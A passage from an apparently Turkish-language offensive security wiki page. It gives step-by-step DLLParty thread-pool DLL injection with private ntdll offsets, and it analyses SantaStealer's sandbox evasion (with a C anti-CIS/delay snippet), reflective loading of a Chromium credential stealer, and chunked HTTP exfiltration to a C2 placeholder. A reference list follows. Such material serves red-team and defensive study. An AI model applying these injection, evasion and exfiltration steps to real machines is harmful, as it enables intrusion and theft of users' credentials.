2. `TP_POOL.CompletionPort` değerini okuyun ve pool'un private worker listesini dolaşın. Test edilen Windows 10 19045 x64 build'inde (`ntdll.dll 10.0.19041.4842`), listenin başı `pool+0x60` konumundadır; her bağlantı `worker+0x10` konumundadır, dolayısıyla `worker+0x38` konumundaki callback-instance slot'u `link+0x28` değerine eşittir. PoC; işaretçi hizalamasını, bağlantıların karşılıklılığını, pool sahipliğini, sıfır olmayan thread ID'lerini, yinelenen düğümleri ve sabit bir liste başını denetler.
3. Kuyruğa alınan completion herhangi bir worker tarafından tüketilebileceğinden, DLL path'ini bulunan **tüm** worker slot'larına yazın. `Callback = LoadLibraryA` olan bir `TP_DIRECT` nesnesini hedef belleğin yazılabilir bir bölgesine yerleştirin. PoC, `VirtualAllocEx` yerine worker stack'inde `last_slot-0x500` konumunu kullanır; bu offset deneyseldir ve etkin stack verileriyle çakışmamalıdır.
4. Hedef completion-port handle'ını çoğaltın ve `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)` çağrısını yapın. Uzak `TP_DIRECT` adresi completion key'dir. Mevcut bir worker, üzerine yazılmış callback-instance işaretçisiyle `LoadLibraryA` çağırır ve hedefin erişebildiği bir DLL'i yükler.

PoC bir hedef PID alır (`DLLParty.exe <target_pid>`) ve `DLLParty.cpp` içinde hard-coded bir DLL path kullanır; x64 executable derlemeden önce hedefin erişebileceği bir path ayarlayın. Ayrıca kendi process'indeki `LoadLibraryA` adresini uzak callback olarak kullanır; dolayısıyla bu adresin hedefte geçerli olduğunu varsayar. Kod, path uzunluğunu 0x58 baytlık önekle karşılaştırmaz veya son öğeyi indekslemeden önce worker dolaşımının bir slot bulup bulmadığını denetlemez. Hedef build için private offset'leri, stack düzenini ve yazılabilir alanı yeniden doğrulayın. `CreateRemoteThreadEx`, shellcode ve `VirtualAllocEx` kullanmamak, process'ler arası yazma işlemlerini veya DLL yükleme telemetrisini ortadan kaldırmaz.<sup>[[46]](#references)[[47]](#references)</sup>

## Fileless Evasion ve Credential Theft için SantaStealer Tradecraft'ı

SantaStealer (diğer adıyla BluelineStealer), modern info-stealer'ların AV bypass, anti-analysis ve credential access yöntemlerini tek bir iş akışında nasıl bir araya getirdiğini gösterir.<sup>[[24]](#references)</sup>

### Keyboard layout gating ve sandbox delay

- Bir config flag'i (`anti_cis`), `GetKeyboardLayoutList` üzerinden yüklü keyboard layout'ları listeler. Cyrillic layout bulunursa örnek boş bir `CIS` işaretçisi bırakır ve stealer'ları çalıştırmadan sonlanır; böylece hariç tutulan locale'lerde çalışmasını önlerken avcılık için bir iz bırakır.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Katmanlı `check_antivm` mantığı

- A varyantı süreç listesini tarar, her adı özel bir rolling checksum ile hash’ler ve sonucu debugger/sandbox araçları için gömülü blocklist’lerle karşılaştırır; aynı checksum işlemini bilgisayar adı üzerinde tekrarlar ve `C:\analysis` gibi çalışma dizinlerini kontrol eder.
- B varyantı sistem özelliklerini inceler (minimum süreç sayısı, yakın zamandaki çalışma süresi), VirtualBox additions’ı tespit etmek için `OpenServiceA("VBoxGuest")` çağırır ve single-stepping’i saptamak için uyku sürelerinin çevresinde zamanlama kontrolleri yapar. Herhangi bir eşleşme modüller başlatılmadan önce işlemi durdurur.

### Fileless yardımcı + çift ChaCha20 reflective loading

- Birincil DLL/EXE, diske bırakılan veya belleğe manuel olarak eşlenen bir Chromium kimlik bilgisi yardımcı programı içerir; fileless modda yardımcı program, hiçbir yardımcı dosya oluşturmamak için import ve relocation işlemlerini kendisi çözümler.
- Bu yardımcı program, ikinci aşama bir DLL’i ChaCha20 ile iki kez şifrelenmiş olarak saklar (iki adet 32 baytlık anahtar + 12 baytlık nonce). Her iki şifre çözme geçişinden sonra blob’u reflective olarak yükler (`LoadLibrary` kullanmadan) ve [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) üzerinden türetilen `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` export’larını çağırır.<sup>[[25]](#references)</sup>
- ChromElevator rutinleri, canlı bir Chromium tarayıcısına inject etmek, AppBound Encryption anahtarlarını devralmak ve ABE güçlendirmesine rağmen SQLite veritabanlarından parolaları/çerezleri/kredi kartlarını doğrudan decrypt etmek için direct-syscall reflective process hollowing kullanır.


### Modüler bellek içi toplama ve parçalı HTTP exfil

- `create_memory_based_log`, genel bir `memory_generators` function-pointer tablosunu dolaşır ve etkinleştirilmiş her modül için (Telegram, Discord, Steam, ekran görüntüleri, belgeler, tarayıcı uzantıları vb.) bir thread başlatır. Her thread sonuçları paylaşılan buffer’lara yazar ve yaklaşık 45 saniyelik join süresinin ardından dosya sayısını bildirir.
- İşlem tamamlandığında her şey, statik olarak bağlanmış `miniz` kütüphanesiyle `%TEMP%\\Log.zip` olarak zip’lenir. Ardından `ThreadPayload1` 15 saniye uyur ve arşivi HTTP POST ile `http://<C2>:6767/upload` adresine 10 MB’lık parçalar halinde gönderir; tarayıcıya ait bir `multipart/form-data` boundary (`----WebKitFormBoundary***`) taklidi yapar. Her parçaya `User-Agent: upload`, `auth: <build_id>`, isteğe bağlı `w: <campaign_tag>` eklenir; son parçaya ise C2’nin birleştirme işleminin tamamlandığını bilmesi için `complete: true` eklenir.

## References

- [1] [Gelişmiş Evasion Tradecraft: Hassas Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stack’ler, malware için artık bedava geçiş yok](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – belgeler](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – örnek](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – örnek](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer için yeni enfeksiyon zinciri ve ConfuserEx tabanlı obfuscation](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Zero trust’ınıza güvenmeli misiniz? Zscaler posture kontrollerini atlatma](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell’den önce: Storm-2603’ün önceki ransomware operasyonlarını inceleme](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Forwarded export’ları kötüye kullanma](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports envanteri (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library arama sırası](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Süreç güvenliği ve erişim hakları](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU başvurusu (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL başlatıcısı](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light (PPL) desteğiyle EDR’lara karşı koyma](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Folder Redirect tekniğiyle Windows Defender’ın koruyucu kabuğunu kırma](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink komut başvurusu](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Saf perdenin ardında: RAT’ten builder’a, coder’a](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer şehre geliyor: Yeni ve iddialı bir infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption şifre çözme](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: API tracing ile Node.js malware’ini alt etme](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Uyuyan Güzel: Crystal Palace ile Adaptix’i uyutma](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Süreç parametresi zehirleme](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Uyuyan Güzel II: CFG, CET ve stack spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko uyku obfuscation’ı](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Dotnet ETW’nizi gizleme](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Red Team operasyonlarında Chrome Remote Desktop’ı kötüye kullanma: Pratik bir rehber](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Defender’ın remediation driver’ını kernel operasyonu primitive’i olarak silahlandırma](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo eşlikçi kodu](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: LLVM kullanarak kendini maskeleyen fonksiyonlar oluşturma](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole kaynak kodu](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe fonksiyonu](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Yönlendirilmiş girdi ve çıktıyla bir child process oluşturma](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: WasmForge ile C# araçlarını yeniden oluşturma](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - C# / .NET projelerini derleme](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept ve kaynak kodu](https://github.com/epersic/DLLParty)
- [47] [DLLParty — shellcodeless DLL injection için thread pool internals’ı kötüye kullanma](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024 benchmark veri kümesi ve thrember araçları](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Red team implant’larını değerlendirmek için EMBER2024 kullanımı](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Machine learning tabanlı tespitlerden kaçınma](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – NetamLoader XAML tabanlı .NET yükleme framework’ü](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – AMSI_RESULT enumeration](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – IAntimalware::Scan metodu](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
- [54] [Zscaler ThreatLabz - 2CLoader teknik analizi](https://zscaler.com/blogs/security-research/2cloader-new-malware-loader-delivering-vidar-and-remus)
- [55] [tprtdll-Injection genel bakış ve export envanteri](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/README.md)
- [56] [Trusted-twin self-injection PoC](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/trustedtwin_self.cpp)
- [57] [Trusted-twin cross-process injection PoC](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/trustedtwin_cross.cpp)
{{#include ../banners/hacktricks-training.md}}
